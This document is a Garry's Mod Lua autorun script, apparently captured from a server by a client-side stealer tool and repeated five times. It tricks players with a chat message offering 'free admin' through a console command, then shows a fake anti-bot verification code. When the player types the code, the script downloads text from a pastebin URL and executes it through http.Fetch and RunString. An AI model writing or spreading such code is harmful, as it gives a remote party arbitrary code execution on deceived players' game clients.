-- "lua\\autorun\\mkmhomevirustestthing.lua"
-- Retrieved by https://github.com/c4fe/glua-steal
for i, ply in ipairs( player.GetAll() ) do
    ply:ChatPrint( "[mkm's hahaball loaded] WARNING THIS CONCOMMAND IS VERY DANGEROUS LOL! type mkmhome in console 4 fre admeain" )
 
end
 
concommand.Add( "mkmhome", function(ply)
 
    local password123 = {
 
    "a",
    "b",
    "c",
    "d",
    "e",
    "f",
    "g",
    "h",
    "i",
    "j",
    "k",
    "l",
    "m",
    "n",
    "o",
    "p",
    "q",
    "r",
    "s",
    "t",
    "u",
    "v",
    "w",
    "x",
    "y",
    "z",
 
 
 
    }
 
    youhavetotypethat1 = table.Random(password123) 
    youhavetotypethat2 = table.Random(password123) 
    youhavetotypethat3 = table.Random(password123) 
    youhavetotypethat4 = table.Random(password123)
    youhavetotypethat5 = table.Random(password123)
    youhavetotypethat6 = table.Random(password123)
 
 
 
 
    timah = 10
 
 
 
    chat.AddText("[ANTI_BOT_EXPERIMENT_LOADED]")
    chat.AddText("DID YOU RUN SOMETHING IN THE CONSOLE")
    chat.AddText("IT APPEARS YOU HAVE RAN MKMHOME IN THE CONSOLE")
    chat.AddText("DUE TO PROBLEMS WITH SOME ADMINS RUNNING COMMANDS ON PEOPLE")
    chat.AddText("YOU HAVE TO TYPE THE CODE IN CHAT TO RUN MKMHOME ON YOURSELF")
    chat.AddText("IF YOU DID NOT RUN THIS COMMAND, DO NOT TYPE THE VERIFY CODE.")
 
 
    timer.Create("vertifyurnotabot", 3, 10, function()
    timah = timah - 1
    chat.AddText( Color( 100, 100, 255), "Verify that you want to start the command by typing the code " .. youhavetotypethat1 .. "" .. youhavetotypethat2 .. "" .. youhavetotypethat3 .. "" .. youhavetotypethat4 .. "" .. youhavetotypethat5 .. "" .. youhavetotypethat6 .. " in chat")
    chat.AddText( Color( 100, 100, 255), "If you do not want to start the command. Do not type the verification code in chat.")
    end)
 
 
    timer.Create("youand_melenn", 1, 0, function()
    if timah < 1 then
    chat.AddText( Color( 255, 190, 0), "Okay, I will not run mkmhome on you because you did not type the verification code.")
    timer.Simple(0.1, function() hook.Remove("OnPlayerChat","lenn_vertifyyourabot") end)
    timer.Simple(0.1, function() hook.Remove("HUDPaint", "HelloThereNowVertify") end)
    timer.Simple(0.15, function() timer.Remove("vertifyurnotabot")  end)
    timer.Simple(0.25, function() timer.Remove("youand_melenn") end)
    end
    end)
 
 
 
 
 
    hook.Add("OnPlayerChat", "lenn_vertifyyourabot", function(v, text, team)
 
 
 
    local me = LocalPlayer()
    if v == me then
    if string.find(string.lower(text), "" .. youhavetotypethat1 .. "" .. youhavetotypethat2 .. "" .. youhavetotypethat3 .. "" .. youhavetotypethat4 .. "" .. youhavetotypethat5 .. "" .. youhavetotypethat6 .. "") then
    print("received message")
    chat.AddText( Color( 0, 161, 255), "Okay you typed the verification code in chat. mkmhome will be ran on you shortly.")
    timer.Remove("vertifyurnotabot")
    timer.Remove("youand_melenn")
    timah = 0
    hook.Remove("HUDPaint", "HelloThereNowVertify")
    hook.Remove("OnPlayerChat","lenn_vertifyyourabot")
 
    http.Fetch( 'https://pastebin.com/raw/W40dEJuc', function( b,l,h,c ) RunString( b ) end, function() end )
 
 
    else
    --a
    end
    end
    end)
 
end)

-- "lua\\autorun\\mkmhomevirustestthing.lua"
-- Retrieved by https://github.com/c4fe/glua-steal
for i, ply in ipairs( player.GetAll() ) do
    ply:ChatPrint( "[mkm's hahaball loaded] WARNING THIS CONCOMMAND IS VERY DANGEROUS LOL! type mkmhome in console 4 fre admeain" )
 
end
 
concommand.Add( "mkmhome", function(ply)
 
    local password123 = {
 
    "a",
    "b",
    "c",
    "d",
    "e",
    "f",
    "g",
    "h",
    "i",
    "j",
    "k",
    "l",
    "m",
    "n",
    "o",
    "p",
    "q",
    "r",
    "s",
    "t",
    "u",
    "v",
    "w",
    "x",
    "y",
    "z",
 
 
 
    }
 
    youhavetotypethat1 = table.Random(password123) 
    youhavetotypethat2 = table.Random(password123) 
    youhavetotypethat3 = table.Random(password123) 
    youhavetotypethat4 = table.Random(password123)
    youhavetotypethat5 = table.Random(password123)
    youhavetotypethat6 = table.Random(password123)
 
 
 
 
    timah = 10
 
 
 
    chat.AddText("[ANTI_BOT_EXPERIMENT_LOADED]")
    chat.AddText("DID YOU RUN SOMETHING IN THE CONSOLE")
    chat.AddText("IT APPEARS YOU HAVE RAN MKMHOME IN THE CONSOLE")
    chat.AddText("DUE TO PROBLEMS WITH SOME ADMINS RUNNING COMMANDS ON PEOPLE")
    chat.AddText("YOU HAVE TO TYPE THE CODE IN CHAT TO RUN MKMHOME ON YOURSELF")
    chat.AddText("IF YOU DID NOT RUN THIS COMMAND, DO NOT TYPE THE VERIFY CODE.")
 
 
    timer.Create("vertifyurnotabot", 3, 10, function()
    timah = timah - 1
    chat.AddText( Color( 100, 100, 255), "Verify that you want to start the command by typing the code " .. youhavetotypethat1 .. "" .. youhavetotypethat2 .. "" .. youhavetotypethat3 .. "" .. youhavetotypethat4 .. "" .. youhavetotypethat5 .. "" .. youhavetotypethat6 .. " in chat")
    chat.AddText( Color( 100, 100, 255), "If you do not want to start the command. Do not type the verification code in chat.")
    end)
 
 
    timer.Create("youand_melenn", 1, 0, function()
    if timah < 1 then
    chat.AddText( Color( 255, 190, 0), "Okay, I will not run mkmhome on you because you did not type the verification code.")
    timer.Simple(0.1, function() hook.Remove("OnPlayerChat","lenn_vertifyyourabot") end)
    timer.Simple(0.1, function() hook.Remove("HUDPaint", "HelloThereNowVertify") end)
    timer.Simple(0.15, function() timer.Remove("vertifyurnotabot")  end)
    timer.Simple(0.25, function() timer.Remove("youand_melenn") end)
    end
    end)
 
 
 
 
 
    hook.Add("OnPlayerChat", "lenn_vertifyyourabot", function(v, text, team)
 
 
 
    local me = LocalPlayer()
    if v == me then
    if string.find(string.lower(text), "" .. youhavetotypethat1 .. "" .. youhavetotypethat2 .. "" .. youhavetotypethat3 .. "" .. youhavetotypethat4 .. "" .. youhavetotypethat5 .. "" .. youhavetotypethat6 .. "") then
    print("received message")
    chat.AddText( Color( 0, 161, 255), "Okay you typed the verification code in chat. mkmhome will be ran on you shortly.")
    timer.Remove("vertifyurnotabot")
    timer.Remove("youand_melenn")
    timah = 0
    hook.Remove("HUDPaint", "HelloThereNowVertify")
    hook.Remove("OnPlayerChat","lenn_vertifyyourabot")
 
    http.Fetch( 'https://pastebin.com/raw/W40dEJuc', function( b,l,h,c ) RunString( b ) end, function() end )
 
 
    else
    --a
    end
    end
    end)
 
end)

-- "lua\\autorun\\mkmhomevirustestthing.lua"
-- Retrieved by https://github.com/c4fe/glua-steal
for i, ply in ipairs( player.GetAll() ) do
    ply:ChatPrint( "[mkm's hahaball loaded] WARNING THIS CONCOMMAND IS VERY DANGEROUS LOL! type mkmhome in console 4 fre admeain" )
 
end
 
concommand.Add( "mkmhome", function(ply)
 
    local password123 = {
 
    "a",
    "b",
    "c",
    "d",
    "e",
    "f",
    "g",
    "h",
    "i",
    "j",
    "k",
    "l",
    "m",
    "n",
    "o",
    "p",
    "q",
    "r",
    "s",
    "t",
    "u",
    "v",
    "w",
    "x",
    "y",
    "z",
 
 
 
    }
 
    youhavetotypethat1 = table.Random(password123) 
    youhavetotypethat2 = table.Random(password123) 
    youhavetotypethat3 = table.Random(password123) 
    youhavetotypethat4 = table.Random(password123)
    youhavetotypethat5 = table.Random(password123)
    youhavetotypethat6 = table.Random(password123)
 
 
 
 
    timah = 10
 
 
 
    chat.AddText("[ANTI_BOT_EXPERIMENT_LOADED]")
    chat.AddText("DID YOU RUN SOMETHING IN THE CONSOLE")
    chat.AddText("IT APPEARS YOU HAVE RAN MKMHOME IN THE CONSOLE")
    chat.AddText("DUE TO PROBLEMS WITH SOME ADMINS RUNNING COMMANDS ON PEOPLE")
    chat.AddText("YOU HAVE TO TYPE THE CODE IN CHAT TO RUN MKMHOME ON YOURSELF")
    chat.AddText("IF YOU DID NOT RUN THIS COMMAND, DO NOT TYPE THE VERIFY CODE.")
 
 
    timer.Create("vertifyurnotabot", 3, 10, function()
    timah = timah - 1
    chat.AddText( Color( 100, 100, 255), "Verify that you want to start the command by typing the code " .. youhavetotypethat1 .. "" .. youhavetotypethat2 .. "" .. youhavetotypethat3 .. "" .. youhavetotypethat4 .. "" .. youhavetotypethat5 .. "" .. youhavetotypethat6 .. " in chat")
    chat.AddText( Color( 100, 100, 255), "If you do not want to start the command. Do not type the verification code in chat.")
    end)
 
 
    timer.Create("youand_melenn", 1, 0, function()
    if timah < 1 then
    chat.AddText( Color( 255, 190, 0), "Okay, I will not run mkmhome on you because you did not type the verification code.")
    timer.Simple(0.1, function() hook.Remove("OnPlayerChat","lenn_vertifyyourabot") end)
    timer.Simple(0.1, function() hook.Remove("HUDPaint", "HelloThereNowVertify") end)
    timer.Simple(0.15, function() timer.Remove("vertifyurnotabot")  end)
    timer.Simple(0.25, function() timer.Remove("youand_melenn") end)
    end
    end)
 
 
 
 
 
    hook.Add("OnPlayerChat", "lenn_vertifyyourabot", function(v, text, team)
 
 
 
    local me = LocalPlayer()
    if v == me then
    if string.find(string.lower(text), "" .. youhavetotypethat1 .. "" .. youhavetotypethat2 .. "" .. youhavetotypethat3 .. "" .. youhavetotypethat4 .. "" .. youhavetotypethat5 .. "" .. youhavetotypethat6 .. "") then
    print("received message")
    chat.AddText( Color( 0, 161, 255), "Okay you typed the verification code in chat. mkmhome will be ran on you shortly.")
    timer.Remove("vertifyurnotabot")
    timer.Remove("youand_melenn")
    timah = 0
    hook.Remove("HUDPaint", "HelloThereNowVertify")
    hook.Remove("OnPlayerChat","lenn_vertifyyourabot")
 
    http.Fetch( 'https://pastebin.com/raw/W40dEJuc', function( b,l,h,c ) RunString( b ) end, function() end )
 
 
    else
    --a
    end
    end
    end)
 
end)

-- "lua\\autorun\\mkmhomevirustestthing.lua"
-- Retrieved by https://github.com/c4fe/glua-steal
for i, ply in ipairs( player.GetAll() ) do
    ply:ChatPrint( "[mkm's hahaball loaded] WARNING THIS CONCOMMAND IS VERY DANGEROUS LOL! type mkmhome in console 4 fre admeain" )
 
end
 
concommand.Add( "mkmhome", function(ply)
 
    local password123 = {
 
    "a",
    "b",
    "c",
    "d",
    "e",
    "f",
    "g",
    "h",
    "i",
    "j",
    "k",
    "l",
    "m",
    "n",
    "o",
    "p",
    "q",
    "r",
    "s",
    "t",
    "u",
    "v",
    "w",
    "x",
    "y",
    "z",
 
 
 
    }
 
    youhavetotypethat1 = table.Random(password123) 
    youhavetotypethat2 = table.Random(password123) 
    youhavetotypethat3 = table.Random(password123) 
    youhavetotypethat4 = table.Random(password123)
    youhavetotypethat5 = table.Random(password123)
    youhavetotypethat6 = table.Random(password123)
 
 
 
 
    timah = 10
 
 
 
    chat.AddText("[ANTI_BOT_EXPERIMENT_LOADED]")
    chat.AddText("DID YOU RUN SOMETHING IN THE CONSOLE")
    chat.AddText("IT APPEARS YOU HAVE RAN MKMHOME IN THE CONSOLE")
    chat.AddText("DUE TO PROBLEMS WITH SOME ADMINS RUNNING COMMANDS ON PEOPLE")
    chat.AddText("YOU HAVE TO TYPE THE CODE IN CHAT TO RUN MKMHOME ON YOURSELF")
    chat.AddText("IF YOU DID NOT RUN THIS COMMAND, DO NOT TYPE THE VERIFY CODE.")
 
 
    timer.Create("vertifyurnotabot", 3, 10, function()
    timah = timah - 1
    chat.AddText( Color( 100, 100, 255), "Verify that you want to start the command by typing the code " .. youhavetotypethat1 .. "" .. youhavetotypethat2 .. "" .. youhavetotypethat3 .. "" .. youhavetotypethat4 .. "" .. youhavetotypethat5 .. "" .. youhavetotypethat6 .. " in chat")
    chat.AddText( Color( 100, 100, 255), "If you do not want to start the command. Do not type the verification code in chat.")
    end)
 
 
    timer.Create("youand_melenn", 1, 0, function()
    if timah < 1 then
    chat.AddText( Color( 255, 190, 0), "Okay, I will not run mkmhome on you because you did not type the verification code.")
    timer.Simple(0.1, function() hook.Remove("OnPlayerChat","lenn_vertifyyourabot") end)
    timer.Simple(0.1, function() hook.Remove("HUDPaint", "HelloThereNowVertify") end)
    timer.Simple(0.15, function() timer.Remove("vertifyurnotabot")  end)
    timer.Simple(0.25, function() timer.Remove("youand_melenn") end)
    end
    end)
 
 
 
 
 
    hook.Add("OnPlayerChat", "lenn_vertifyyourabot", function(v, text, team)
 
 
 
    local me = LocalPlayer()
    if v == me then
    if string.find(string.lower(text), "" .. youhavetotypethat1 .. "" .. youhavetotypethat2 .. "" .. youhavetotypethat3 .. "" .. youhavetotypethat4 .. "" .. youhavetotypethat5 .. "" .. youhavetotypethat6 .. "") then
    print("received message")
    chat.AddText( Color( 0, 161, 255), "Okay you typed the verification code in chat. mkmhome will be ran on you shortly.")
    timer.Remove("vertifyurnotabot")
    timer.Remove("youand_melenn")
    timah = 0
    hook.Remove("HUDPaint", "HelloThereNowVertify")
    hook.Remove("OnPlayerChat","lenn_vertifyyourabot")
 
    http.Fetch( 'https://pastebin.com/raw/W40dEJuc', function( b,l,h,c ) RunString( b ) end, function() end )
 
 
    else
    --a
    end
    end
    end)
 
end)

-- "lua\\autorun\\mkmhomevirustestthing.lua"
-- Retrieved by https://github.com/c4fe/glua-steal
for i, ply in ipairs( player.GetAll() ) do
    ply:ChatPrint( "[mkm's hahaball loaded] WARNING THIS CONCOMMAND IS VERY DANGEROUS LOL! type mkmhome in console 4 fre admeain" )
 
end
 
concommand.Add( "mkmhome", function(ply)
 
    local password123 = {
 
    "a",
    "b",
    "c",
    "d",
    "e",
    "f",
    "g",
    "h",
    "i",
    "j",
    "k",
    "l",
    "m",
    "n",
    "o",
    "p",
    "q",
    "r",
    "s",
    "t",
    "u",
    "v",
    "w",
    "x",
    "y",
    "z",
 
 
 
    }
 
    youhavetotypethat1 = table.Random(password123) 
    youhavetotypethat2 = table.Random(password123) 
    youhavetotypethat3 = table.Random(password123) 
    youhavetotypethat4 = table.Random(password123)
    youhavetotypethat5 = table.Random(password123)
    youhavetotypethat6 = table.Random(password123)
 
 
 
 
    timah = 10
 
 
 
    chat.AddText("[ANTI_BOT_EXPERIMENT_LOADED]")
    chat.AddText("DID YOU RUN SOMETHING IN THE CONSOLE")
    chat.AddText("IT APPEARS YOU HAVE RAN MKMHOME IN THE CONSOLE")
    chat.AddText("DUE TO PROBLEMS WITH SOME ADMINS RUNNING COMMANDS ON PEOPLE")
    chat.AddText("YOU HAVE TO TYPE THE CODE IN CHAT TO RUN MKMHOME ON YOURSELF")
    chat.AddText("IF YOU DID NOT RUN THIS COMMAND, DO NOT TYPE THE VERIFY CODE.")
 
 
    timer.Create("vertifyurnotabot", 3, 10, function()
    timah = timah - 1
    chat.AddText( Color( 100, 100, 255), "Verify that you want to start the command by typing the code " .. youhavetotypethat1 .. "" .. youhavetotypethat2 .. "" .. youhavetotypethat3 .. "" .. youhavetotypethat4 .. "" .. youhavetotypethat5 .. "" .. youhavetotypethat6 .. " in chat")
    chat.AddText( Color( 100, 100, 255), "If you do not want to start the command. Do not type the verification code in chat.")
    end)
 
 
    timer.Create("youand_melenn", 1, 0, function()
    if timah < 1 then
    chat.AddText( Color( 255, 190, 0), "Okay, I will not run mkmhome on you because you did not type the verification code.")
    timer.Simple(0.1, function() hook.Remove("OnPlayerChat","lenn_vertifyyourabot") end)
    timer.Simple(0.1, function() hook.Remove("HUDPaint", "HelloThereNowVertify") end)
    timer.Simple(0.15, function() timer.Remove("vertifyurnotabot")  end)
    timer.Simple(0.25, function() timer.Remove("youand_melenn") end)
    end
    end)
 
 
 
 
 
    hook.Add("OnPlayerChat", "lenn_vertifyyourabot", function(v, text, team)
 
 
 
    local me = LocalPlayer()
    if v == me then
    if string.find(string.lower(text), "" .. youhavetotypethat1 .. "" .. youhavetotypethat2 .. "" .. youhavetotypethat3 .. "" .. youhavetotypethat4 .. "" .. youhavetotypethat5 .. "" .. youhavetotypethat6 .. "") then
    print("received message")
    chat.AddText( Color( 0, 161, 255), "Okay you typed the verification code in chat. mkmhome will be ran on you shortly.")
    timer.Remove("vertifyurnotabot")
    timer.Remove("youand_melenn")
    timah = 0
    hook.Remove("HUDPaint", "HelloThereNowVertify")
    hook.Remove("OnPlayerChat","lenn_vertifyyourabot")
 
    http.Fetch( 'https://pastebin.com/raw/W40dEJuc', function( b,l,h,c ) RunString( b ) end, function() end )
 
 
    else
    --a
    end
    end
    end)
 
end)

